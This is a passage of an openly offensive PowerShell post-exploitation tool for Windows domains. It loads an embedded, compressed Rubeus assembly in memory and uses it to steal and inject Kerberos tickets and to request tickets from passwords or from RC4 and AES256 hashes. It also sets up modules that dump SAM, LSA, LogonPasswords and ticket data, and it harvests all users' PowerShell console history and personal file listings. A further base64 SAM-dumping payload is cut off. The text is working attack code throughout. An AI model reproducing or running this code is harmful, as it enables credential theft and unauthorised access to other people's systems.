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"))
    $decompressed = New-Object IO.Compression.GzipStream($a,[IO.Compression.CoMPressionMode]::DEComPress)
    $output = New-Object System.IO.MemoryStream
    $decompressed.CopyTo( $output )
    [byte[]] $byteOutArray = $output.ToArray()
    $RAS = [System.Reflection.Assembly]::Load($byteOutArray)

    $vars = New-Object System.Collections.Generic.List[System.Object]

    foreach ($args in $Command.Split(" "))
    {
        $vars.Add($args)
    }

    $passed = [string[]]$vars.ToArray()

    $BindingFlags= [Reflection.BindingFlags] "NonPublic,Static"

    $OldConsoleOut = [Console]::Out
    $StringWriter = New-Object IO.StringWriter
    [Console]::SetOut($StringWriter)
    $PrivateMethod = [Rubeus.Program].GetMethod('Main')

    if($PrivateMethod){
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
    else{
      $PrivateMethod = [Rubeus.Program].GetMethod('Main')
      $PrivateMethod.Invoke($Null,@(,$passed))
      }
     [Console]::SetOut($OldConsoleOut)
    $Results = $StringWriter.ToString()
    $Results
    }
}

################################################################################################################
##################################### Ticket logic for authentication ##########################################
################################################################################################################
# Set the userDomain when impersonating a user in one domain for access to an alternate domain
if ($UserDomain -ne ""){}


# Check if the current user is an administrator
$CheckAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

# If CurrentUser is not set to $True, use Rubeus to store the current user's ticket
if (!$CurrentUser) {
    # If the method is not RDP
    if ($Method -ne "RDP") {
        try {
            $BaseTicket = Invoke-Rubeus "tgtdeleg /nowrap" | Out-String
            $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
        }
        Catch {
            try {
                Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
                Write-Host "Current user ticket retrieval failed. Trying alternate methods..."
                Start-Sleep -Seconds 2

                if (!$CheckAdmin) {
                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /nowrap" | Out-String
                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                    if ($OriginalUserTicket -notlike "doI*") {
                        Write-Host "[-] " -NoNewline -ForegroundColor "Red"
                        Write-Host "Unable to retrieve any Kerberos tickets"
                        return
                    }

                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "SUCCESS!"
                }
                elseif ($CheckAdmin) {
                    $BaseTicket = Invoke-Rubeus "dump /service:krbtgt /user:$env:username /nowrap" | Out-String
                    $OriginalUserTicket = ($BaseTicket | Select-String -Pattern 'doI.*' | Select-Object -First 1).Matches.Value.Trim()
                    if ($OriginalUserTicket -notlike "doI*") {
                        Write-Host "[-] " -NoNewline
                        Write-Host "Unable to retrieve any Kerberos tickets" -ForegroundColor "Red"
                        return
                    }

                    Write-Host "[+] " -ForegroundColor "Green" -NoNewline
                    Write-Host "SUCCESS!"
                }
            }
            Catch {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Unable to retrieve any Kerberos tickets"
                return
            }
        }

        # Check if Password or Hash has been provided
         if ($Ticket -ne ""){ 
            if ($Ticket -and (Test-Path -Path $Ticket -PathType Leaf)) {
            $Ticket = Get-Content -Path $Ticket -Raw}


            $ProvidedTicket = Invoke-Rubeus -Command "describe /ticket:$Ticket"

            # Check if an error has occurred
            if ($ProvidedTicket -like "*/ticket:X*") {
                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-Host "Invalid ticket provided"
                return
            }

            # Use regular expression to extract the Username
            $TicketUsername = [regex]::Match($ProvidedTicket, "UserName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketRealm = [regex]::Match($ProvidedTicket, "UserRealm\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketExpiry = [regex]::Match($ProvidedTicket, "EndTime\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value
            $TicketType = [regex]::Match($ProvidedTicket, "ServiceName\s+:  (.+)$", [System.Text.RegularExpressions.RegexOptions]::Multiline).Groups[1].Value

            # Display the extracted information
            Write-Host
            Write-Host "[*] " -ForegroundColor "Yellow" -NoNewline
            Write-Host "Supplied Ticket Details"
            
            if ($TicketType -like "krbtgt/*") { Write-Host "    - Type     : TGT" }
            if ($TicketType -notlike "krbtgt/*") { Write-Host "    - Type     : TGS" }
            
            Write-Host "    - UserName : $TicketUsername"
            Write-Host "    - Realm    : $TicketRealm"
            Write-Host "    - Expires  : $TicketExpiry"
            Write-Host
            
            # Attempt to inject the ticket into the current session
            $InjectTicket = Invoke-Rubeus -Command "ptt /ticket:$Ticket"
            if ($InjectTicket -like "*Error 1398*") {

                Write-Host "[-] " -ForegroundColor "Red" -NoNewline
                Write-host "Ticket expired"
                    klist purge | Out-Null
                    Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
                        return
            }
    }
       elseif ($Password -ne "") {
            klist purge | Out-Null
            
            if ($UserDomain -ne ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /password:$Password /opsec /force /ptt"}
            elseif ($UserDomain -eq ""){$AskPassword = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /password:$Password /opsec /force /ptt"}
            
        if ($AskPassword -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect password or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($AskPassword -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect password or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        }
       elseif ($Hash -ne "") {
        if ($Hash.Length -eq 32) {
        klist purge | Out-Null
        
        if ($UserDomain -ne ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UserDomain /rc4:$Hash /opsec /force /ptt"}
        if ($UserDomain -eq ""){$AskRC4 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /rc4:$Hash /opsec /force /ptt"}
        
        if ($AskRC4 -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($AskRC4 -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }
    }
       elseif ($Hash.Length -eq 64) {
        klist purge | Out-Null

        if ($UserDomain -ne ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$UseDomain /aes256:$Hash /opsec /force /ptt"}
        if ($UserDomain -eq ""){$Ask256 = Invoke-Rubeus -Command "asktgt /user:$Username /domain:$Domain /aes256:$Hash /opsec /force /ptt"}

        if ($Ask256 -like "*KDC_ERR_PREAUTH_FAILED*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }

        if ($Ask256 -like "*Unhandled Rubeus exception:*"){
            Write-Host "[-] " -ForegroundColor "Red" -NoNewline
            Write-Host "Incorrect hash or username"
            klist purge | Out-Null
            Invoke-Rubeus "ptt /ticket:$OriginalUserTicket" | Out-Null
            return
        }
    }
       else {
        Write-Host "[-] " -ForegroundColor "Red" -NoNewline
        Write-Host "Supply either a 32-character RC4/NT hash or a 64-character AES256 hash"
        Write-Host 
        Write-Host
        return

	        }
        }
    }
}

################################################################################################################
################################## Information based on selected module ########################################
################################################################################################################

if ($Method -eq "SessionHunter"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Searching for systems where privileged users' credentials might be in running memory"
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "Filtering by those for which we have admin rights"
    Write-Host
    Start-Sleep -Seconds 3
}

$moduleMessages = @{
    "KerbDump"         = "Tickets will be written to $KerbDump"
    "Tickets"          = "Tickets will be written to $MimiTickets"
    "LSA"              = "LSA output will be written to $LSA"
    "ekeys"            = "eKeys output will be written to $ekeys"
    "SAM"              = "SAM output will be written to $SAM"
    "LogonPasswords"   = "LogonPasswords output will be written to $LogonPasswords"
    "ConsoleHistory"   = "Console History output will be written to $ConsoleHistory"
    "Files"            = "File output will be written to $UserFiles"
}

if ($moduleMessages.ContainsKey($Module)) {
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host $moduleMessages[$Module]
    
    if (!$ShowOutput){
        Write-Host "- " -ForegroundColor "Yellow" -NoNewline
        Write-Host "Use -ShowOutput to display results in the console"
        ""
    }
}
elseif ($Method -eq "GenRelayList"){
    Write-Host "- " -ForegroundColor "Yellow" -NoNewline
    Write-Host "SMB Signing output will be written to $SMB"
}


################################################################################################################
######################################## Local scripts and modules #############################################
################################################################################################################

$ConsoleHostHistory = @'
Write-Output ""
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$foundHistoryFile = $false

foreach ($User in $Users) {
    $historyFilePath = Join-Path -Path $User.FullName -ChildPath "AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"

    if (Test-Path -Path $historyFilePath -ErrorAction "SilentlyContinue") {
        $foundHistoryFile = $true

        $historyContent = Get-Content -Path $historyFilePath -Raw
        $historyLines = $historyContent -split "`n"
        Write-output ""
        Write-output "-----[$User]-----"
        $historyLines | Where-Object { $_ -match '\S' } | ForEach-Object { Write-output $_.Trim() }
    }
}

if (-not $foundHistoryFile) {
    Write-Output "No Results"
}

'@



$Files = @'
$usersFolderPath = "C:\Users"
$users = Get-ChildItem -Path $usersFolderPath -Directory

$uninterestingFiles = @("Thumbs.db", "desktop.ini", "desktop.lnk", "Icon?", "Icon\r", "Firefox.lnk", "Microsoft Edge.lnk")
$excludedStartsWith = @("ntuser.dat", "ntuser.ini", "ntuser.pol")

foreach ($user in $users) {
    $userDownloads = Join-Path -Path $user.FullName -ChildPath "Downloads"
    $userDocuments = Join-Path -Path $user.FullName -ChildPath "Documents"
    $userDesktop = Join-Path -Path $user.FullName -ChildPath "Desktop"
    $userHome = $user.FullName

    $downloadsFiles = Get-ChildItem -Path $userDownloads -File -Force -ErrorAction SilentlyContinue
    $documentsFiles = Get-ChildItem -Path $userDocuments -File -Force -ErrorAction SilentlyContinue
    $desktopFiles = Get-ChildItem -Path $userDesktop -File -Force -ErrorAction SilentlyContinue
    $homeFiles = Get-ChildItem -Path $userHome -File -Force -ErrorAction SilentlyContinue

    $downloadsFiles = $downloadsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $documentsFiles = $documentsFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $desktopFiles = $desktopFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }
    $homeFiles = $homeFiles | Where-Object { $uninterestingFiles -notcontains $_.Name -and $excludedStartsWith -notcontains $_.Name -and $_.Name -notlike "ntuser.dat*" -and $_.Extension -ne ".tmp" }

    $hasFiles = $downloadsFiles.Count -gt 0 -or $documentsFiles.Count -gt 0 -or $desktopFiles.Count -gt 0 -or $homeFiles.Count -gt 0

    if ($hasFiles) {
        Write-Host ""
        Write-Host "----------------------------------------------------------------------------------------------"
        Write-Host ("[User] $user")

        if ($downloadsFiles.Count -gt 0) {
        ""
            Write-Host ("[Downloads]")
            $downloadsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($documentsFiles.Count -gt 0) {
        ""
            Write-Host ("[Documents]")
            $documentsFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($desktopFiles.Count -gt 0) {
        ""
            Write-Host ("[Desktop]")
            $desktopFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }

        if ($homeFiles.Count -gt 0) {
        ""
            Write-Host ("[Home]")
            $homeFiles | Sort-Object Name | ForEach-Object {
                $fileSize = if ($_.Length -ge 1MB) {
                    "{0:N2} MB" -f ($_.Length / 1MB)
                } else {
                    "{0:N2} KB" -f ($_.Length / 1KB)
                }
                Write-Host ("- $($_.Name) ($fileSize)")
            }
        }
        Write-Host "----------------------------------------------------------------------------------------------"
    }
}
'@





$LocalSAM = @'
Write-Output "" ; function DumpSAM{$gz="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
